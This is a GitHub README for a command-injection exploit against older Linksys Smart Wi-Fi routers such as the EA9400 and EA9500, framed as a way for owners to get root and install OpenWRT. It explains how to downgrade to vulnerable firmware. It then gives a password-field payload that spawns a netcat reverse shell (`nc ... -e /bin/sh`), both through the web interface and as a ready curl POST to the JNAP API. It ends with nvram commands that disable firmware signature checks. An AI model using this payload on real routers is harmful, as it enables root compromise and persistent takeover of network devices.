# Linksys-Router-RCE
A exploit for older Linksys Smart Wi-Fi routers that's able to get root shell access and unsigned firmware (like OpenWRT) with just the web admin login.

<img width="854" height="480" alt="Demo video showing the exploit being used on a Linksys EA9400" src="https://github.com/user-attachments/assets/c5ca5fff-0502-4b27-876c-5f6aee4e0611" />


## IMPORTANT:
This exploit was discovered by IOActive and patched in 2017 (It's still possible to downgrade the firmware from the web interface though) but since they never released a PoC I used AI to look through my vulnerable firmware I extracted and it found the exploit. (Only the exploit was found with AI but this writing is not AI generated)

### ALSO I'M NOT RESPONSIBLE FOR ANY DAMAGED ROUTERS, UNAUTHORIZED TAMPERING, OR ANY OTHER DAMAGES CAUSED FROM THIS EXPLOIT. IT IS YOUR RESPONSIBILITY TO NOT BREAK THE LAW OR CAUSE ANY DAMAGES USING THIS EXPLOIT.

## Tested devices:
### Linksys EA9400, downgraded from firmware 1.0.3.181249 to 1.0.2.174688 using [downgrade method 2](#method-2-might-not-work)

### According to [Slowly-Grokking](https://github.com/SomeTechyGuy/Linksys-Router-RCE/issues/1), this exploit worked on their EA9500V1.1 that was downgraded from firmware 1.1.9.210876 to 1.1.6.173418 using [downgrade method 1](#method-1-recommended)

### If you would like to help contribute to this list by testing this exploit on your own router, you can request to add your device [here](https://github.com/SomeTechyGuy/Linksys-Router-RCE/issues/new?template=1-new-router.yml)

## Downgrading the firmware:
### If you have a vulnerable router model (You can check with the list [here](https://www.ioactive.com/linksys-smart-wi-fi-vulnerabilities/)), but you have a patched firmware (To check, look at the firmware release notes on the Linksys website for your model and if you have a firmware with IOActive security patches you must downgrade the firmware to do this exploit), you will need to downgrade the firmware first

### Method 1 (recommended):
[Thanks to Slowly-Grokking for finding this out](https://github.com/SomeTechyGuy/Linksys-Router-RCE/issues/1)

1. Find the firmware update download for your router (for example, the EA9400 firmware updates are [here](https://support.linksys.com/kb/article/562-en/)).
2. Choose the region of the router if you have the option to.
3. Right click the "Download" button and copy the link.
4. Change the firmware version in the link to the version you want to downgrade to. (for example, you could change `http://downloads.linksys.com/downloads/firmware/FW_EA9400_1.0.3.181249_prod.gpg.img` to `http://downloads.linksys.com/downloads/firmware/FW_EA9400_1.0.2.174688_prod.gpg.img`)
<img width="546" height="308" alt="Old firmware download illustration" src="https://github.com/user-attachments/assets/d4ba0b65-3733-4d6c-a456-19ee6f5bbf38" />

5. To flash the old firmware, go to your routers web interface (usually [192.168.1.1](http://192.168.1.1))
6. Once you're logged in it should look like this:
<img width="640" height="322" alt="Linksys Smart Wi-Fi web interface screenshot" src="https://github.com/user-attachments/assets/04c396ae-3ec1-499f-83e6-af922aa4e052" />

7. Click "Connectivity"
8. There will be a "Router Firmware Update" section at the right, click "Choose File":
<img width="640" height="322" alt="Screenshot of the router 'Connectivity' screen" src="https://github.com/user-attachments/assets/24ecd8fd-d423-4751-9829-997a58b1c0e0" />

9. Choose the old firmware you downloaded and flash it.
10. If you downloaded the correct firmware you should see this:
<img width="640" height="322" alt="Screenshot of the Linksys Smart Wi-Fi web interface showing a popup saying the router is rebooting" src="https://github.com/user-attachments/assets/c09dfd63-da19-426c-8dc2-de7478ebb680" />

11. Once the router is rebooted, you should see the firmware version change to the older one.

### Method 2 (might not work):
#### This method might not downgrade far back enough, this is because the router uses 2 OS partitions, when the router updates, it flashes the firmware to the other partition so it can revert to the working firmware in case the update fails, this method switches the OS partition, so you will only go back to the last firmware version you had before updating.

1. Go to the routers web interface (usually [192.168.1.1](http://192.168.1.1)) and login.
2. Go to the "Troubleshooting" menu
3. Go to the "Diagnostics" section, at this point this is what you should see:
<img width="640" height="322" alt="Screenshot of the Linksys Smart Wi-Fi interface showing a settings page with the 'Restore previous firmware' button highlighted" src="https://github.com/user-attachments/assets/3d4c0769-8ece-49e1-8059-d9c2206ebf92" />

4. You should see a button saying "Restore previous firmware" (highlighted in the image above) which will downgrade your firmware to the one you had before once you click it. The image below is what you should see:
<img width="640" height="322" alt="Screenshot of the Linksys Smart Wi-Fi interface with a popup asking if the user would like to continue to downgrade their firmware and the 'Yes' button highlighted" src="https://github.com/user-attachments/assets/36ddad0e-305e-4763-8918-0a12ca88276f" />

5. Once you click "Yes", the router will downgrade the firmware and reboot.




# Doing the exploit:
### This was done on Linux so don't complain if it gives errors on Windows.

## Web interface method (recommended):
### Make sure you have the following noted:

 - Your PCs local IP (for example: `192.168.1.119`)
 - The routers admin password (for example: `admin`)
 - The router IP (for example: `192.168.1.1`)

### Start a netcat listener, for example to use port 4444 it's the following:

    nc -lvp 4444

### Run the exploit:

 1. Log into the web interface
 2. Go to the "Connectivity" menu
 3. Change the router password to the following (with the correct command):

    ```admin\`nc 192.168.1.119 4444 -e /bin/sh\` &```
    
### (make sure to change ```192.168.1.119``` to your PCs local IP)
### If the netcat listener says that the router connected but shows no text output, that means it's working but it only outputs text when you run a command.
### Don't forget to add the ```&```, if you don't, the router will still run the command but the web interface will stop working until you reboot.


## Command line method (not recommended for beginners):
#### You must get the JNAP token first, you can only get one if you know the admin password:

### Get the JNAP authorization token (easy way):
Encode your admin password with `admin:` right before it in base64, then add the word "Basic" before the base64, for example if your admin password is `admin`, you would encode `admin:admin` into base64, so your JNAP token would be `Basic YWRtaW46YWRtaW4=`

### Get the JNAP authorization token (hard way):


 1. Go in the routers web interface (for example: `192.168.1.1`).
 2. Right click and open inspect element.
 3. Go to the "Network" section of inspect element.
 4. Log into the router.
 5. Find a request going to `/JNAP`.
 6. Click it.
 7. In the "Headers" section for the request you want to find the `X-JNAP-Authorization` header (for example it could say: `X-JNAP-Authorization: Basic YWRtaW46YWRtaW4=`).
 8. If it doesn't have the token in that request look at other JNAP requests until you find it.
 9. Note the token so you don't forget it.

### Now that you have the JNAP token, you can start the RCE: 

### Make sure you have the following noted:

 - Your PCs local IP (for example: `192.168.1.119`)
 - The routers admin password (for example `admin`)
 - The router IP (for example: `192.168.1.1`)
 - The JNAP authorization token (for example: `Basic YWRtaW46YWRtaW4=`)

### Start a netcat listener, for example to use port 4444 it's the following:

    nc -lvp 4444

### In a 2nd shell run the exploit (make sure to change the information to what you have):

    curl -X POST http://192.168.1.1/JNAP/ -H "Content-Type: application/json" -H "X-JNAP-Action: http://linksys.com/jnap/core/SetAdminPassword" -H "X-JNAP-Authorization: Basic YWRtaW46YWRtaW4=" -d '{"adminPassword": "admin`nc 192.168.1.119 4444 -e /bin/sh` &"}' 
#### In this command, it changes the admin password to a malicious one that runs ```nc 192.168.1.119 4444 -e /bin/sh``` using the example JNAP token for authentication.
### If the netcat listener shows the router connect but shows no text output, that means it's working but it only outputs text when you run a command.
### If you remove the ```&``` from the password, the web server will shut off until you reboot. 

# Running unsigned firmware (only tested for US model EA9400/EA9500 routers.)
### If your router requires firmware to be signed (like the US model Linksys EA9400/EA9500), but you don't want to use a serial connection, you can run in your routers root shell the following:

    nvram set cert_region=EU
    nvram commit

### You will now be able to run unsigned firmware by flashing it in the web interface.

### You may be able to use something other than EU for ```cert_region``` because if I remember correctly, the router checks ```cert_region``` every time it updates, and if ```cert_region``` is not equal to ```US```, the router will allow any firmware (including unsigned ones like OpenWRT or you could modify the stock firmware to add cool things).
